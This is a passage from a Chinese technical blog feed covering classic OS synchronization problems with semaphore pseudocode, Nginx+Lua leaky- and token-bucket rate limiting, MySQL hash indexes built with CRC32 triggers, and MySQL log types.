<h3 id="4-Peterson算法"><a href="#4-Peterson算法" class="headerlink" title="4.Peterson算法"></a>4.Peterson算法</h3><p>就在问题无法解决时候，Peterson提出了Peterson算法，既能保证符合进程同步与互斥条件又不会产生及饥饿。为了防止两个进程无尽等待，Peterson设置了turn标志，每个进程先置自己标志后再设置turn标志。那么Peterson算法究竟是什么样的呢？</p>
<pre><code>process1() {                                process2() {
    flag[1] = true;                           flag[2] = true;
    turn = 2;                                 turn = 1;
    while(flag[2] &amp;&amp; turn == 2){}            while(flag[2]  &amp;&amp; turn == 1){}
    critical section;                        critical section;
    flag[1] = false;                         flag[2] = false;
    remainder section;                        remainder section;
}                                            }
</code></pre><h1 id="0x02-经典同步与互斥事件"><a href="#0x02-经典同步与互斥事件" class="headerlink" title="0x02.经典同步与互斥事件"></a>0x02.经典同步与互斥事件</h1><h3 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h3><p><img src="https://static.blog.homeway.me/2017-01-13-understand-os-process-mutex-and-synchronization-producer-consumer-buffer.jpg" alt="Producer &amp;&amp; Consumer"><br>常见问题：生产者、消费者共享一组初始为空，大小为n的缓冲区空间，只有缓冲区不满的时候，生产者才能把消息放入缓冲区，否则必须等待；只有缓冲区不空的时候，消费者才能从缓冲区取出消息；并且放入与取出必须互斥操作。</p>
<p>缓冲区操作必须互斥，因此在对缓冲区操作前要加锁 <code>P(mutex);</code> 执行完后释放锁 <code>V(mutex);</code> 缓冲区操作满和不满需要进程间同步通信通知，empty 和 full 用于进程间同步，当缓冲区有消息时执行 <code>V(full);</code> 唤醒Consumer()，当缓冲区有空位时，执行 <code>V(empty);</code> 唤醒Producer()。</p>
<pre><code>semaphore mutex = 1;
semaphore full = 0;
semaphore empty = n;

Process Producer() {
    while(True) {
        P(empty);
        P(mutex);    //互斥操作资源加锁P(mutex);
        //produce...
        V(mutex);    //互斥操作释放资源V(mutex);
        V(full);    //进程同步通知Consumer()生产完毕
    }
}
Process Consumer() {
    while(True) {
        P(full);
        P(mutex);    //互斥操作资源加锁P(mutex);
        //consume...
        V(mutex);    //互斥操作释放资源V(mutex);
        V(empty);    //进程同步通知Producer()消费完毕
    }    
}
</code></pre><h3 id="读写者问题"><a href="#读写者问题" class="headerlink" title="读写者问题"></a>读写者问题</h3><p>常见问题：系统文件读写，有读者和写者两个并发进程共享一个文件，当多个进程共同读取文件时不会发生问题，但读者和写者、写者和写者不能同时作用于共享文件。总结：允许多个读者读文件；一次仅一个写者写文件；写者完成之前不允许读者和写者操作文件；写者执行写之前应等待读者、写者退出。</p>
<p>保证不对读者做限制，必须要对写者加锁，而何时加锁呢？需要根据读者数量做判断，当读者读以前数量为0时候，需要对写者加锁，当读者退出时候发现读者数为0，则需要释放写者锁。对于读者对 <code>count</code> 以及 <code>mutex</code> 锁的操作，需要加 <code>P(mutex);</code> 读者互斥锁。由上面分析可知写者处于弱势，优先权低，为了解决这个问题，引入 <code>write_first</code> 保证读者和写者公平竞争。</p>
<pre><code>int count = 0;                //记录读者数
semaphore mutex = 1;        //对count、write锁操作互斥
semaphore write = 1;        //写进程
semaphore write_first = 1;    //写优先
Process Writer() {
    while(True) {
        P(write_first);    //读者优先
        P(write);            //读写者互斥
        //writing...
        V(write);
        V(write_first);
    }
}
Process Reader() {
    while(True) {
        P(write_first);    //读者优先
        P(mutex);            //对count、write锁操作互斥
        if(count == 0) P(write);    //读者只有一个，对写者上锁
        count++;                        //读者数+1
        V(mutex);
        V(write_first);
        //reading...
        P(write_first);
        P(mutex);        //对count、write锁操作互斥
        count--;        //读者数-1
        if(count == 0) V(write);    //读者只有一个，对写者解锁
        V(mutex);
        V(write_first);
    }
}
</code></pre><h3 id="双向读写者问题"><a href="#双向读写者问题" class="headerlink" title="双向读写者问题"></a>双向读写者问题</h3><p><img src="https://static.blog.homeway.me/blog/2017-01-13-understand-os-process-mutex-and-synchronization-bridge_crossing.jpg" alt="Crossing the bridge"></p>
<p>常见问题：单向通行的桥，不允许双向交汇但允许同向而行并且显示单向一次最多 <code>max_size</code> 通行量。这个问题由读写者引申而来，读者 &amp;&amp; 写者都必须互斥操作，并且限制了同时操作数量。作为对称处理，需要同时对东向、西向进程设立锁，并且记录当前用户数以方便为对方设置锁。</p>
<pre><code>int east_count = 0;
int west_count = 0;
semaphore meast = 1;    //互斥操作east数据
semaphore mwest = 1;    //互斥操作west数据
semaphore mutex = 1;    //east与west只允许一方向
semaphore max_size = n;//单方向最大通行量

Process east(int i) {
    P(meast);            //互斥操作east数据
    if(east_count == 0) P(mutex);    //对于第一次获得锁方向
    east_count++;
    V(meast);
    P(max_size);        //单方向最大通行量同步
    //acrossing the bridge
    V(max_size);
    P(meast);
    east_count--;
    if(east_count == 0) V(mutex);    //对于最后一次占用锁
    V(meast);
}
Process west(int i) {
    P(mwest);            //互斥操作east数据
    if(west_count == 0) P(mutex);    //对于第一次获得锁方向
    west_count++;
    V(mwest);
    P(max_size);    //单方向最大通行量同步
    //acrossing the bridge
    V(max_size);
    P(mwest);
    west_count--;
    if(west_count == 0) V(mutex);    //对于最后一次占用锁
    V(mwest);
}
</code></pre><h3 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h3><p><img src="https://static.blog.homeway.me/blog/2017-01-13-understand-os-process-mutex-and-synchronization-philosopher-dining.jpg" alt="Philosopher dining"><br>常见问题：一张桌子上有5个哲学家，每两个哲学家中间放一根筷子，哲学家只有两件事：吃饭、思考。如果哲学家拿到左右手两根筷子就吃饭，进餐完毕后保持思考，如果一根筷子在旁边哲学家手里，只能等待。</p>
<p>试想，当哲学家都同时拿起左手边的筷子，等到他们想拿右手边的筷子却已被拿走，系统进入死锁。如何让一个哲学家拿到左右两根筷子而不造成死锁或者饥饿现象？(1)让他们同时拿左右两根筷子(2)对每个哲学家动作做规定，当哲学家抢占到抢筷子是加互斥锁，阻止其他哲学家抢占筷子。</p>
<pre><code>semaphore mutex = 1;
semaphore chopsticks[5] = {1, 1, 1, 1, 1};//筷子序号
Process P(int i) {    //哲学家ID=0,1,2,3,4
    do {
        P(mutex);    //保证仅有一个抢占，防止死锁
        P(chopsticks[i]);    //获取左手筷子
        P(chopsticks[(i + 1) % 5]);    //获取右手筷子
        V(mutex);
        //eating...
        V(chopsticks[i]);    //释放左手筷子
        V(chopsticks[(i + 1) % 5]);    //释放右手筷子
        //thinking...
    } while(True);
}
</code></pre><h3 id="吸烟者问题"><a href="#吸烟者问题" class="headerlink" title="吸烟者问题"></a>吸烟者问题</h3><p>常见问题：有3个吸烟者，A有纸张+烟草，B有纸张+胶水，C有烟草+胶水，当且仅当他们拥有纸张+烟草+胶水才能制作香烟吸烟。进程提供者无限随机提供三种物品中的一种，仅当吸烟者吸完烟，供应者受到信号才提供资源。</p>
<p>供应者与吸烟者是同步关系，由于供应者无法同时提供资源，供应者提供资源是一个互斥操作。</p>
<pre><code>int random;                //随机数
semaphore finish = 0;        //抽烟结束同步信号
semaphore resource1 = 0;    //纸张+烟草
semaphore resource2 = 0;    //纸张+胶水
semaphore resource3 = 0;    //烟草+胶水
Process Offer() {            //资源提供者
    while(True) {
        random = rand();    //获取随机数
        if(random % 3 == 0) //根据随机数提供资源
            V(resource1);
        else if(random % 3 == 1) 
            V(resource2);
        else if(random % 3 == 2) 
            V(resource3);
        //offering...
        P(finish);
    }
}
Process User1() {        //有烟草
    while(True) {
        P(resource2);    //等待纸张+胶水
        //smoking...
        V(finish);
    }
}
Process User2() {        //有纸张
    while(True) {
        P(resource3);    //等待烟草+胶水
        //smoking...
        V(finish);
    }
}
Process User1() {        //有胶水
    while(True) {
        P(resource1);    //等待纸张+烟草
        //smoking...
        V(finish);
    }
}
</code></pre><p><br></p>
<hr>

<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-01-13-understand-os-process-mutex-and-synchronization"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-01-13-understand-os-process-mutex-and-synchronization" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/">http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/</a></h4><ul>
<li>by 小草</li>
</ul>
<p>2017-01-13</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nginx流量拦截算法]]></title>
      <url>http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx-lua.png" alt="nginx-lua-static-merger"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x00-About"><a href="#0x00-About" class="headerlink" title="0x00.About"></a>0x00.About</h1><p>电商平台营销时候，经常会碰到的大流量问题，除了做流量分流处理，可能还要做用户黑白名单、信誉分析，进而根据用户ip信誉权重做相应的流量拦截、限制流量。</p>
<p>Nginx自身有的请求限制模块<a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html" target="_blank" rel="external">ngx_http_limit_req_module</a>、流量限制模块<a href="http://nginx.org/en/docs/stream/ngx_stream_limit_conn_module.html" target="_blank" rel="external">ngx_stream_limit_conn_module</a>基于令牌桶算法，可以方便的控制令牌速率，自定义调节限流，就能很好的限制请求数量，然而，nginx.conf问题还是在于无法热加载。</p>
<p>之前做过的流量限制方案，《<a href="http://homeway.me/2015/08/11/nginx-lua-redis-access-control/">Nginx+Lua+Redis访问频率控制</a>》，原理是动态的基于ip，实现简单的漏桶算法，限制访问频率。</p>
<p>这里的话，就简单分析下流量限制算法：漏桶算法、令牌桶算法、滑动窗口等在Nginx+Lua中如何动态绑定uri，动态设定rate实现。</p>
<p><hr><br></p>
<h1 id="0x01-Leaky-Bucket-Algorithm"><a href="#0x01-Leaky-Bucket-Algorithm" class="headerlink" title="0x01.Leaky Bucket Algorithm"></a>0x01.Leaky Bucket Algorithm</h1><p>漏桶算法可以很好地限制容量池的大小，从而防止流量暴增。如果针对uri+ip作为监测的key，就可以实现定向的设定指定ip对指定uri容量大小，超出的请求做队列处理（队列处理要引入消息机制）或者丢弃处理。这也是v2ex对流量拦截的算法，针对uri+ip做流量监测。</p>
<p><img src="http://xiaocao.u.qiniudn.com/blog/2015-10-21-nginx-lua-traffic-limit-algorithm-leaky-bucket.png" alt="Leaky Bucket Algorithm"></p>
<p>漏桶算法实现上来说，就是建立一个队列，在Redis中以uri:ip作为key，队列上实现FIFO，在请求的前奏实现插入，请求完成后实现删除。</p>
<p>实现方法是在Nginx发送http数据给用户后，通过<code>ngx.eof()</code>关闭TCP协议，做其他操作，可以参见<a href="http://wiki.jikexueyuan.com/project/openresty-best-practice/continue-after-eof.html" target="_blank" rel="external">请求返回后继续执行</a>。</p>
<p>下面是部分代码：</p>
<pre><code>local _M = { _VERSION = &quot;2015.10.19&quot;, OK = 1, BUSY = 2, FORBIDDEN = 3 }

function _M.do_list(red, uri, key, size, rate)
    local ok, err = red:expire(uri .. &quot;:&quot; .. key, size)
    if not ok then
        ngx.log(ngx.WARN, &quot;redis set expire error: &quot;, err)
        return nil
    end
    local ok, err = red:rpush(uri .. &quot;:&quot; .. key, ngx.time())
    if not ok then
        ngx.log(ngx.WARN, &quot;redis rpush error: &quot;, err)
        return nil
    end
    local res, err = red:lrange(uri .. &quot;:&quot; .. key, -(size * rate), -1)
    if not ok then
        ngx.log(ngx.WARN, &quot;redis lrange error: &quot;, err)
        return nil
    end
    if #res &lt; (size * rate) or res[#res] - res[1] &lt; size then
        return _M.OK
    end
    return nil
end
</code></pre><p>漏桶算法优点很明显，简单、高效，能恰当拦截容量外的暴力流量。</p>
<p>但缺点也明显，无法对流量做频率处理，比如桶size大小设置范围内，进行并发攻击依然能大流量并发效果，桶容量不可以过小，否则容易卡死正常用户。</p>
<h1 id="0x02-Token-Bucket-Algorithm"><a href="#0x02-Token-Bucket-Algorithm" class="headerlink" title="0x02.Token Bucket Algorithm"></a>0x02.Token Bucket Algorithm</h1><p>令牌桶算法通过发放令牌，根据令牌的rate频率做请求频率限制，容量限制等。</p>
<p><img src="http://xiaocao.u.qiniudn.com/blog/2015-10-21-nginx-lua-traffic-limit-algorithm-token-bucket-lgorithm.jpg" alt="Token Bucket Algorithm"></p>
<ul>
<li><p>系统根据rate(r/s)频率参数向指定桶中添加token，满则保持，不添加</p>
</li>
<li><p>当用户请求Nginx时候，分析uri是否需要限制流量，限制则执行令牌桶算法</p>
</li>
<li><p>如果桶满了，则请求通过，消耗令牌一枚；如果请求Redis发现key不存在，则通过size装满令牌桶；如果桶内令牌空，则废弃或等待流量。</p>
</li>
</ul>
<p>Nginx + Lua 模型中实现必然不能跑一个程序添加令牌了，这个时候需要在分析令牌时候，通过计算时间间隔一次性添加完令牌桶内令牌。具体算法是：rate * time_distance = token_count令牌数量， if token_count &gt; size 桶容量， token_count = size。</p>
<p>实现的存储结构是用Hash哈希存储 uri:ip -&gt; token_count，字段通过EXPIRE设定过期时间，达到长时间不访问清除桶数据效果。</p>
<p>桶的大小、请求的频率限制用Redis哈希表存储，不存在则默认不做流量拦截。</p>
<p>用户黑白名单通过Order SET设定信誉权重，权重越大，代表危险性越大，进而通过百分比改变接口限定rate频率。</p>
<p>令牌桶算法优势在于能针对uri做定向rate、size等，不仅限制总请求大小，还限制平均频率大小。缺点是，还是容易导致误判等问题，并切用户的信誉无法完全准确。</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>1.<a href="https://en.wikipedia.org/wiki/Token_bucket" target="_blank" rel="external">Token Bucket Algorithm</a></p>
<p>2.<a href="https://en.wikipedia.org/wiki/Leaky_bucket" target="_blank" rel="external">Token Bucket Algorithm</a></p>
<p>3.<a href="http://www.cnblogs.com/zhengyun_ustc/archive/2012/11/17/topic1.html" target="_blank" rel="external">电商课题I：集群环境下业务限流</a></p>
<p><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-10-21-nginx-lua-traffic-limit-algorithm"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-10-21-nginx-lua-traffic-limit-algorithm" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm">http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm</a></h4><p>-by小草</p>
<p>2015-10-21 21:49:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MySQL索引之哈希索引]]></title>
      <url>http://homeway.me/2015/09/13/mysql-hash-index/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-mysql.png" alt="mysql-log"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x00-About"><a href="#0x00-About" class="headerlink" title="0x00.About"></a>0x00.About</h1><p>索引（Index）是帮助MySQL高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。</p>
<p>从MySQL逻辑架构来看，MySQL有三层架构，第一层连接，第二层查询解析、分析、优化、视图、缓存，第三层，存储引擎。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-09-13-mysql-hash-index-mysql-design.png" alt="MySQL逻辑架构"></p>
<p>索引通过分开查询片，节省了扫描查找时间，大大提升查询效率。</p>
<p>大部分数据库系统及文件系统都采用B-Tree或其变种B+Tree作为索引结构。</p>
<p>索引主要在存储引擎层上，不同的引擎也就有不同的B-Tree算法。</p>
<p><br><hr></p>
<h1 id="0x01-Hash-Index"><a href="#0x01-Hash-Index" class="headerlink" title="0x01.Hash Index"></a>0x01.Hash Index</h1><p>哈希索引只有Memory, NDB两种引擎支持，Memory引擎默认支持哈希索引，如果多个hash值相同，出现哈希碰撞，那么索引以链表方式存储。</p>
<p>但是，Memory引擎表只对能够适合机器的内存切实有限的数据集。</p>
<p>要使InnoDB或MyISAM支持哈希索引，可以通过伪哈希索引来实现，叫自适应哈希索引。</p>
<p>主要通过增加一个字段，存储hash值，将hash值建立索引，在插入和更新的时候，建立触发器，自动添加计算后的hash到表里。</p>
<h2 id="直接索引"><a href="#直接索引" class="headerlink" title="直接索引"></a>直接索引</h2><p>假如有一个非常非常大的表，如下：</p>
<pre><code>CREATE TABLE IF NOT EXISTS `User` (
  `id` int(10) NOT NULL COMMENT &#39;自增id&#39;,
  `name` varchar(128) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;用户名&#39;,
  `email` varchar(128) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;用户邮箱&#39;,
  `pass` varchar(64) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;用户密码&#39;,
  `last` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#39;最后登录时间&#39;,
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
</code></pre><p>这个时候，比如说，用户登陆，我需要通过email检索出用户，通过explain得到如下：</p>
<blockquote>
<p>mysql&gt; explain SELECT <code>id</code> FROM <code>User</code> WHERE email = ‘ooxx@gmail.com’ LIMIT 1;</p>
</blockquote>
<pre><code>+----+-------------+-------+------+---------------+------+---------+------+--------+-------------+
| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       |
+----+-------------+-------+------+---------------+------+---------+------+--------+-------------+
|  1 | SIMPLE      | User  | ALL  | NULL          | NULL | NULL    | NULL | 384742 | Using where |
+----+-------------+-------+------+---------------+------+---------+------+--------+-------------+
</code></pre><p>发现 <code>rows = 384742</code> 也就是要在384742里面进行比对email这个字段的字符串。</p>
<p>这条记录运行的时间是：Query took 0.1744 seconds，数据库的大小是40万。</p>
<p>从上面可以说明，如果直接在email上面建立索引，除了索引区间匹配，还要进行字符串匹配比对，email短还好，如果长的话这个查询代价就比较大。</p>
<p>如果这个时候，在email上建立哈希索引，查询以int查询，性能就比字符串比对查询快多了。</p>
<h2 id="Hash-算法"><a href="#Hash-算法" class="headerlink" title="Hash 算法"></a>Hash 算法</h2><p>建立哈希索引，先选定哈希算法，这里选用CRC32。</p>
<p>《高性能MySQL》说到的方法CRC32算法，建立SHA或MD5算法是划算的，本身位数都有可能比email段长了。</p>
<h2 id="INSERT-UPDATE-SELECT-操作"><a href="#INSERT-UPDATE-SELECT-操作" class="headerlink" title="INSERT UPDATE SELECT 操作"></a>INSERT UPDATE SELECT 操作</h2><p>在表中添加hash值的字段：</p>
<blockquote>
<p>mysql&gt; ALTER TABLE <code>User</code> ADD COLUMN email_hash int unsigned NOT NULL DEFAULT 0;</p>
</blockquote>
<p>接下来就是在UPDATE和INSERT的时候，自动更新 <code>email_hash</code> 字段，通过MySQL触发器实现：</p>
<pre><code>DELIMITER |
CREATE TRIGGER user_hash_insert BEFORE INSERT ON `User` FOR EACH ROW BEGIN
SET NEW.email_hash=crc32(NEW.email);
END;
|
CREATE TRIGGER user_hash_update BEFORE UPDATE ON `User` FOR EACH ROW BEGIN
SET NEW.email_hash=crc32(NEW.email);
END;
|
DELIMITER ;
</code></pre><p>这样的话，我们的SELECT请求就会变成这样：</p>
<blockquote>
<p>mysql&gt; SELECT <code>email</code>, <code>email_hash</code> FROM <code>User</code> WHERE email_hash = CRC32(“F2dgTSWRBXSZ1d3O@gmail.com”) AND <code>email</code> = “F2dgTSWRBXSZ1d3O@gmail.com”;</p>
</blockquote>
<pre><code>+----------------------------+------------+
| email                      | email_hash |
+----------------------------+------------+
| F2dgTSWRBXSZ1d3O@gmail.com | 2765311122 |
+----------------------------+------------+
</code></pre><p>在没建立hash索引时候，请求时间是 0.2374 seconds，建立完索引后，请求时间直接变成 0.0003 seconds。</p>
<p><code>AND email = &quot;F2dgTSWRBXSZ1d3O@gmail.com&quot;</code> 是为了防止哈希碰撞导致数据不准确。</p>
<p><br><hr></p>
<h1 id="0x02-Hash-Index-缺点"><a href="#0x02-Hash-Index-缺点" class="headerlink" title="0x02.Hash Index 缺点"></a>0x02.Hash Index 缺点</h1><p>哈希索引也有几个缺点：</p>
<ul>
<li>索引存放的是hash值,所以仅支持 &lt; = &gt; 以及 IN 操作</li>
<li>hash索引无法通过操作索引来排序，因为存放的时候经过hash计算，但是计算的hash值和存放的不一定相等，所以无法排序</li>
<li>不能避免全表扫描，只是由于在memory表里支持非唯一值hash索引，就是不同的索引键，可能存在相同的hash值</li>
<li>如果哈希碰撞很多的话，性能也会变得很差</li>
<li>哈希索引无法被用来避免数据的排序操作</li>
</ul>
<p><br><hr></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] Baron Scbwartz等 著，王小东等 译；<a href="http://www.amazon.cn/%E9%AB%98%E6%80%A7%E8%83%BDMySQL-%E6%96%BD%E7%93%A6%E8%8C%A8/dp/B00C1W58DE" target="_blank" rel="external">高性能MySQL（High Performance MySQL）</a>；电子工业出版社，2010</p>
<p>[2] <a href="http://www.searchdatabase.com.cn/showcontent_39678.htm" target="_blank" rel="external">《MySQL的B-Tree索引和Hash索引的区别》</a></p>
<p>[3] <a href="http://itindex.net/detail/51924-mysql-%E7%B4%A2%E5%BC%95-%E4%BC%98%E5%8C%96" target="_blank" rel="external">《mysql 索引优化 btree hash rtree》</a></p>
<p><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-13-mysql-hash-index"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-13-mysql-hash-index" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/09/13/mysql-hash-index"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/09/13/mysql-hash-index">http://homeway.me/2015/09/13/mysql-hash-index</a></h4><p>-by小草</p>
<p>2015-09-13 15:49:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MySQL日志分析]]></title>
      <url>http://homeway.me/2015/09/12/mysql-log/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-mysql.png" alt="mysql-log"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>MySQL有四种类型的日志：Error Log、General Query Log、Binary Log 和 Slow Query Log。</p>
<p>第一种错误日志，记录MySQL运行过程ERROR,WARNING,NOTE等信息，系统出错或者某条记录出问题可以查看ERROR日志。</p>
<p>第二种日常运行日志，记录MySQL运行中的每条请求数据。</p>
<p>第三种二进制日志，包含了一些事件，这些事件描述了数据库的改动，如建表、数据改动等，也包括一些潜在改动，主要用于备份恢复、回滚等操作。</p>
<p>第四种慢查询日志，用于MySQL性能调优。</p>
<p><br><hr></p>
<h1 id="0x02-Error-Log"><a href="#0x02-Error-Log" class="headerlink" title="0x02.Error Log"></a>0x02.Error Log</h1><p>MySQL错误日志默认以<code>hostname.err</code>存放在MySQL日志目录，如果不知道MySQL当前的错误日志目录可以使用查询语句：</p>
<blockquote>
<p>mysql&gt;  show variables like ‘log_error’;</p>
</blockquote>
<pre><code>+---------------+--------------------------------------+
| Variable_name | Value                                |
+---------------+--------------------------------------+
| log_error     | /usr/local/var/mysql/mysql-error.log |
+---------------+--------------------------------------+
</code></pre><p>修改错误日志地址可以在<code>/etc/my.cnf</code>中添加<code>--log-error[=file_name]</code>选项来开启mysql错误日志。</p>
<p>错误日志记录了MySQL Server每次启动和关闭的详细信息以及运行过程中所有较为严重的警告和错误信息。</p>
<p>知道了MySQL错误日志地址，我们就可以查看MySQL错误日志：</p>
<pre><code>2015-09-12 16:03:20 2624 [ERROR] InnoDB: Unable to lock ./ibdata1, error: 35
2015-09-12 16:03:20 2624 [Note] InnoDB: Check that you do not already have another mysqld process using the same InnoDB data or log files.
2015-09-13 00:03:21 2183 [Note] InnoDB: Shutdown completed; log sequence number 426783897
</code></pre><p><code>InnoDB: Unable to lock ./ibdata1, error: 35</code> 可以得出资源被抢占，有可能是开了多个MySQL线程。</p>
<p><br><hr></p>
<h1 id="0x03-General-Query-Log"><a href="#0x03-General-Query-Log" class="headerlink" title="0x03.General Query Log"></a>0x03.General Query Log</h1><p>日常请求的SQL：<br>添加方式一样在 <code>/etc/my.cnf</code> 中添加 <code>general-log-file[=file_name]</code>。</p>
<p><br><hr></p>
<h1 id="0x04-Binary-Log"><a href="#0x04-Binary-Log" class="headerlink" title="0x04.Binary Log"></a>0x04.Binary Log</h1><h2 id="启用Binlog"><a href="#启用Binlog" class="headerlink" title="启用Binlog"></a>启用Binlog</h2><p>修改 <code>/etc/my.cnf</code>：</p>
<pre><code>binlog_format = STATEMENT
binlog_cache_size = 2M
max_binlog_cache_size = 4M
max_binlog_size = 512M
log-bin = master-bin
log-bin-index = master-bin.index
</code></pre><p><code>log-bin-index</code> 指向 <code>master-bin</code> 这个文件，记录有哪些分块的Binlog文件名。<br><code>log-bin</code> 记录Binlog文件名前缀，后缀会用数字递增。</p>
<h2 id="Binlog格式"><a href="#Binlog格式" class="headerlink" title="Binlog格式"></a>Binlog格式</h2><p>Binlog有3种格式，STATMENT,ROW,MIXED。<a href="https://dev.mysql.com/doc/refman/5.1/en/binary-log-mixed.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.1/en/binary-log-mixed.html</a></p>
<p>混合格式（mixed）会在适当时候切换row和statment格式，statment就是直接的SQL语句格式。</p>
<h2 id="分析Binlog"><a href="#分析Binlog" class="headerlink" title="分析Binlog"></a>分析Binlog</h2><p>通过MySQL自带的mysqlbinlog 命令，可以直接查看到Binlog转码数据：</p>
<blockquote>
<p>mysqlbinlog /usr/local/var/mysql/master-bin.000117</p>
</blockquote>
<p>得到：</p>
<pre><code># at 335
#150913  0:05:12 server id 1  end_log_pos 366 CRC32 0xa31b50db     Xid = 151
COMMIT/*!*/;
DELIMITER ;
# End of log file
ROLLBACK /* added by mysqlbinlog */;
/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;
/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/;
</code></pre><p>第一行包含日志文件偏移字节值（335）。</p>
<p>第二行包含：</p>
<ul>
<li><p>事件的日期事件，MySQL会使用他们来产生SET TIMESTAMP</p>
</li>
<li><p>服务器的服务器id</p>
</li>
<li><p>end_log_pos 下一个事件的偏移字节</p>
</li>
<li><p>事件类型，这里是Xid，常见的还有其他，例如：Intvar，Query，Stop，Format_desc</p>
</li>
<li><p>原服务器上执行语句的线程id，用于审计和CONNECTION_ID()</p>
</li>
<li><p>exec_time对于master端的Binlog来说是执行这个event所花费的时间</p>
</li>
<li><p>原服务器产生的错误代码</p>
</li>
</ul>
<p>通过</p>
<blockquote>
<p>mysql&gt; show binlog events;</p>
</blockquote>
<p>也可以的到binlog数据：</p>
<pre><code>| master-bin.000002 | 3861 | Query       |         1 |        3954 ||
| master-bin.000002 | 3954 | Intvar      |         1 |        3986 ||
| master-bin.000002 | 3986 | Query       |         1 |        4475 | use `dropbox`; INSERT INTO `UserLog` (`uid`, `fids`, `nids`, `msg`, `log`, `from`, `type`, `ctime`) VALUES (&#39;1&#39;, &#39;[\&quot;35\&quot;,\&quot;33\&quot;,\&quot;21\&quot;]&#39;, &#39;[\&quot;22\&quot;,\&quot;21\&quot;,\&quot;11\&quot;,\&quot;4\&quot;,\&quot;3\&quot;]&#39;, &#39;从垃圾箱恢复: 恢复文件 \&#39;[\&quot;35\&quot;,\&quot;33\&quot;,\&quot;21\&quot;]\&#39; 恢复文件夹 \&#39;[\&quot;22\&quot;,\&quot;21\&quot;,\&quot;11\&quot;,\&quot;4\&quot;,\&quot;3\&quot;]\&#39;&#39;, &#39;[[\&quot;35\&quot;,\&quot;33\&quot;,\&quot;21\&quot;],[\&quot;22\&quot;,\&quot;21\&quot;,\&quot;11\&quot;,\&quot;4\&quot;,\&quot;3\&quot;]]&#39;, &#39;cloud.jue.so&#39;, &#39;recover_by_trash&#39;, &#39;2015-09-07 00:51:31&#39;)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| master-bin.000002 | 4475 | Xid         |         1 |        4506 | COMMIT /* xid=423 */
</code></pre><h2 id="查看Binlog信息"><a href="#查看Binlog信息" class="headerlink" title="查看Binlog信息"></a>查看Binlog信息</h2><blockquote>
<p>mysql&gt; show variables like ‘%binlog%’;</p>
</blockquote>
<pre><code>+-----------------------------------------+----------------------+
| Variable_name                           | Value                |
+-----------------------------------------+----------------------+
| binlog_cache_size                       | 2097152              |
| binlog_checksum                         | CRC32                |
| binlog_direct_non_transactional_updates | OFF                  |
| binlog_error_action                     | IGNORE_ERROR         |
| binlog_format                           | STATEMENT            |
| binlog_gtid_simple_recovery             | OFF                  |
| binlog_max_flush_queue_time             | 0                    |
| binlog_order_commits                    | ON                   |
| binlog_rows_query_log_events            | OFF                  |
| binlog_stmt_cache_size                  | 32768                |
| binlogging_impossible_mode              | IGNORE_ERROR         |
| innodb_api_enable_binlog                | OFF                  |
| innodb_locks_unsafe_for_binlog          | OFF                  |
| max_binlog_cache_size                   | 4194304              |
| max_binlog_size                         | 536870912            |
| max_binlog_stmt_cache_size              | 18446744073709547520 |
| simplified_binlog_gtid_recovery         | OFF                  |
+-----------------------------------------+----------------------+
</code></pre><p><br><hr></p>
<h1 id="Slow-Query-Log"><a href="#Slow-Query-Log" class="headerlink" title="Slow Query Log"></a>Slow Query Log</h1><h2 id="开启-Slow-Query"><a href="#开启-Slow-Query" class="headerlink" title="开启 Slow Query"></a>开启 Slow Query</h2><p>修改<code>/etc/my.cnf</code>：</p>
